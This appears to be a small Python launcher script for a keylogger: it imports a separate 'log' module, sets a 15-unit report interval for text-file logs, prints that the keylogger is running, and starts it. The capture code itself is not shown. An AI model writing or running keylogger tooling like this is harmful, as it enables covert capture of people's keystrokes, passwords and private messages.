import log

if __name__ == "__main__":
    keylog = log.Keylog(15) # the rate of which to create a report (txt file into the current directory)
    print("KEYLOGGER IS NOW RUNNING, view your documents Directory > Keylog Files to view your keylogs.")
    keylog.start() # starting the keylog
